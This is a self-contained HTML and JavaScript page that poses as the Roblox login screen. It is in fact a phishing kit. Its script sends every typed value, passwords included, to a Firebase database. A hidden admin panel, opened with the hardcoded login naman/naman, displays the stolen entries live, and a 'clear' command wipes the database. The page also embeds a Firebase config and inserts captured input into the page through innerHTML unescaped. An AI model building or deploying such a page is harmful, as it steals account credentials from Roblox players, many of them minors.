<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>Roblox Admin Panel</title>

<style>

/* =========================
   RESET
========================= */

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

/* =========================
   BODY
========================= */

body{

    background:#000;

    color:white;

    overflow-x:hidden;
}

/* =========================
   NAVBAR
========================= */

.navbar{

    width:100%;

    height:52px;

    background:#191b1f;

    position:fixed;

    top:0;
    left:0;

    z-index:1000;

    display:flex;

    align-items:center;

    justify-content:space-between;

    padding:0 16px;

    border-bottom:1px solid #2d3138;
}

.nav-left{

    display:flex;

    align-items:center;

    gap:14px;
}

.menu-icon{

    color:white;

    font-size:22px;

    cursor:pointer;
}

.logo-nav{

    width:78px;

    height:28px;

    object-fit:contain;
}

.signup-btn{

    background:#0066ff;

    color:white;

    border:none;

    padding:8px 16px;

    border-radius:8px;

    font-size:14px;

    font-weight:bold;

    cursor:pointer;
}

/* =========================
   HERO
========================= */

.hero{

    width:100%;

    min-height:100vh;

    display:flex;

    justify-content:center;

    align-items:center;

    padding-top:52px;

    background:

    linear-gradient(
    rgba(0,0,0,0.7),
    rgba(0,0,0,0.85)
    ),

    url('https://images.unsplash.com/photo-1542751110-97427bbecf20?q=80&w=2070');

    background-size:cover;

    background-position:center;
}

/* =========================
   LOGIN BOX
========================= */

.login-box{

    width:92%;

    max-width:430px;

    background:#1f222c;

    border-radius:16px;

    padding:35px 28px;

    box-shadow:0 0 40px rgba(0,0,0,0.6);
}

.login-box h1{

    text-align:center;

    font-size:34px;

    margin-bottom:24px;
}

/* =========================
   INPUTS
========================= */

.input-box{

    position:relative;

    margin-bottom:16px;
}

.input-box input{

    width:100%;

    padding:15px;

    border:none;

    border-radius:12px;

    background:#2d313d;

    color:white;

    font-size:16px;

    outline:none;
}

.input-box input::placeholder{

    color:#aaa;
}

/* SHOW BUTTON */

.show-pass-btn{

    position:absolute;

    right:12px;

    top:50%;

    transform:translateY(-50%);

    background:none;

    border:none;

    color:#00aaff;

    font-size:14px;

    font-weight:bold;

    cursor:pointer;
}

/* =========================
   BUTTONS
========================= */

.login-btn{

    width:100%;

    padding:15px;

    border:2px solid white;

    border-radius:12px;

    background:transparent;

    color:white;

    font-size:18px;

    font-weight:bold;

    cursor:pointer;

    transition:0.3s;
}

.login-btn:hover{

    background:white;

    color:black;
}

.secondary-btn{

    width:100%;

    margin-top:14px;

    padding:14px;

    border:none;

    border-radius:12px;

    background:#373c4a;

    color:white;

    font-size:15px;

    cursor:pointer;
}

/* =========================
   LINKS
========================= */

.links{

    margin-top:18px;

    text-align:center;
}

.links a{

    color:#d0d0d0;

    text-decoration:none;
}

.signup-text{

    margin-top:24px;

    text-align:center;

    color:#b0b0b0;

    font-size:15px;
}

.signup-text a{

    color:white;

    text-decoration:none;

    font-weight:bold;
}

/* =========================
   TEXT
========================= */

#message{

    margin-top:16px;

    text-align:center;

    color:#ff4d4d;
}

#result{

    margin-top:18px;

    text-align:center;

    color:#00ff99;
}

/* =========================
   ADMIN PANEL
========================= */

#adminPanel{

    display:none;
}

.panel-box{

    margin-top:22px;

    background:#2a2f3a;

    border-radius:12px;

    padding:18px;

    max-height:400px;

    overflow-y:auto;
}

/* =========================
   ACTIVITY
========================= */

.activity-card{

    background:#232833;

    padding:12px;

    border-radius:10px;

    margin-bottom:12px;
}

.activity-title{

    color:#00aaff;

    font-weight:bold;

    margin-bottom:6px;
}

.activity-data{

    color:white;

    font-size:14px;
}

.activity-time{

    color:#999;

    font-size:12px;

    margin-top:8px;
}

</style>
</head>

<body>

<!-- NAVBAR -->

<div class="navbar">

    <div class="nav-left">

        <div class="menu-icon">

            ☰

        </div>

        <img
        class="logo-nav"
        src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">

    </div>

    <button class="signup-btn">

        Sign Up

    </button>

</div>

<!-- HERO -->

<div class="hero">

    <!-- LOGIN -->

    <div class="login-box" id="loginBox">

        <h1>Login to Roblox</h1>

        <!-- USERNAME -->

        <div class="input-box">

            <input
            type="text"
            id="username"
            placeholder="Username">

        </div>

        <!-- PASSWORD -->

        <div class="input-box">

            <input
            type="password"
            id="password"
            placeholder="Password">

            <button
            class="show-pass-btn"
            onclick="togglePassword()"
            id="toggleBtn">

            Show

            </button>

        </div>

        <!-- LOGIN -->

        <button
        class="login-btn"
        onclick="login()">

        Log In

        </button>

        <!-- FORGOT -->

        <div class="links">

            <a href="#">

                Forgot Password or Username?

            </a>

        </div>

        <!-- EXTRA -->

        <button class="secondary-btn">

            Email Me a One-Time Code

        </button>

        <button class="secondary-btn">

            Use Another Device

        </button>

        <!-- SIGNUP -->

        <div class="signup-text">

            Don't have an account?

            <a href="#">

                Sign Up

            </a>

        </div>

        <p id="message"></p>

    </div>

    <!-- ADMIN PANEL -->

    <div class="login-box" id="adminPanel">

        <h1>

            Admin Panel

        </h1>

        <!-- COMMAND -->

        <div class="input-box">

            <input
            type="text"
            id="commandInput"
            placeholder="Enter command">

        </div>

        <!-- RUN -->

        <button
        class="login-btn"
        onclick="runCommand()">

        Run Command

        </button>

        <!-- COMMANDS -->

        <div class="panel-box">

            <h3>Commands</h3>

            <p>kick</p>
            <p>ban</p>
            <p>shutdown</p>
            <p>clear</p>

        </div>

        <!-- LIVE DATA -->

        <div class="panel-box">

            <h3>

                Online + Local User Activity

            </h3>

            <div id="savedDataBox"></div>

        </div>

        <p id="result"></p>

    </div>

</div>

<!-- FIREBASE -->

<script type="module">

/* =========================
   IMPORTS
========================= */

import { initializeApp }

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {

    getDatabase,

    ref,

    push,

    onValue,

    remove

}

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

/* =========================
   FIREBASE CONFIG
========================= */

const firebaseConfig = {

  apiKey: "AIzaSyA5uGGN1a_ydQILFtz1RxI1JYJF3FoKZ6U",

  authDomain: "robloxadmin-5b4d1.firebaseapp.com",

  databaseURL: "https://robloxadmin-5b4d1-default-rtdb.firebaseio.com",

  projectId: "robloxadmin-5b4d1",

  storageBucket: "robloxadmin-5b4d1.firebasestorage.app",

  messagingSenderId: "1028232627372",

  appId: "1:1028232627372:web:cfb765f26fc2b045a44b09",

  measurementId: "G-XQXYL2DMEC"

};

/* =========================
   START FIREBASE
========================= */

const app = initializeApp(firebaseConfig);

const db = getDatabase(app);

/* =========================
   SHOW/HIDE PASSWORD
========================= */

window.togglePassword = function(){

    const passInput =

    document.getElementById("password");

    const btn =

    document.getElementById("toggleBtn");

    if(passInput.type === "password"){

        passInput.type = "text";

        btn.innerText = "Hide";

    }

    else{

        passInput.type = "password";

        btn.innerText = "Show";

    }

};

/* =========================
   SAVE ONLINE + LOCAL
========================= */

window.saveActivity = function(type,data){

    const info = {

        type:type,

        data:data,

        time:new Date().toLocaleString()

    };

    /* FIREBASE */

    push(
        ref(db,"activities"),
        info
    );

    /* LOCAL STORAGE */

    let localData =

    JSON.parse(
        localStorage.getItem("backup")
    ) || [];

    localData.push(info);

    localStorage.setItem(

        "backup",

        JSON.stringify(localData)

    );

};

/* =========================
   LIVE FIREBASE DATA
========================= */

onValue(

    ref(db,"activities"),

    (snapshot)=>{

        let output = "";

        let items = [];

        snapshot.forEach((child)=>{

            items.push(child.val());

        });

        items.reverse();

        items.slice(0,50).forEach((item)=>{

            output += `

            <div class="activity-card">

                <div class="activity-title">

                    ${item.type}

                </div>

                <div class="activity-data">

                    ${item.data}

                </div>

                <div class="activity-time">

                    ${item.time}

                </div>

            </div>

            `;

        });

        document
        .getElementById("savedDataBox")
        .innerHTML = output;

    }

);

/* =========================
   LOGIN
========================= */

window.login = function(){

    const user =

    document
    .getElementById("username")
    .value;

    const pass =

    document
    .getElementById("password")
    .value;

    saveActivity(

        "Login Attempt",

        `Username: ${user}`

    );

    /* ADMIN */

    if(user === "naman"
    && pass === "naman"){

        document
        .getElementById("loginBox")
        .style.display = "none";

        document
        .getElementById("adminPanel")
        .style.display = "block";

        saveActivity(

            "Admin Login",

            user

        );

    }

    else{

        document
        .getElementById("message")
        .innerText =
        "Invalid Username or Password";

        saveActivity(

            "Failed Login",

            user

        );

    }

};

/* =========================
   TRACK BUTTONS
========================= */

document.addEventListener(

"click",

(e)=>{

    if(e.target.tagName === "BUTTON"){

        saveActivity(

            "Button Clicked",

            e.target.innerText

        );

    }

});

/* =========================
   TRACK INPUTS
========================= */

document.addEventListener(

"input",

(e)=>{

    if(e.target.tagName === "INPUT"){

        saveActivity(

            "User Typed",

            `${e.target.placeholder}
            : ${e.target.value}`

        );

    }

});

/* =========================
   COMMANDS
========================= */

window.runCommand = function(){

    const cmd =

    document
    .getElementById("commandInput")
    .value
    .toLowerCase();

    const result =

    document
    .getElementById("result");

    saveActivity(

        "Command Used",

        cmd

    );

    /* KICK */

    if(cmd === "kick"){

        result.innerText =
        "Player kicked successfully!";

    }

    /* BAN */

    else if(cmd === "ban"){

        result.innerText =
        "Player banned successfully!";

    }

    /* CLEAR */

    else if(cmd === "clear"){

        remove(
            ref(db,"activities")
        );

        localStorage.clear();

        result.innerText =
        "Firebase + LocalStorage cleared!";

    }

    /* SHUTDOWN */

    else if(cmd === "shutdown"){

        document.body.innerHTML = `

        <div style="

        height:100vh;

        display:flex;

        justify-content:center;

        align-items:center;

        flex-direction:column;

        background:black;

        color:red;

        font-size:45px;

        font-family:Arial;

        ">

        WEBSITE SHUTDOWN

        <p style="
        margin-top:20px;
        font-size:20px;
        color:white;
        ">

        Closing Website...

        </p>

        </div>

        `;

    }

    /* UNKNOWN */

    else{

        result.innerText =
        "Unknown command!";

    }

};

</script>

</body>
</html>
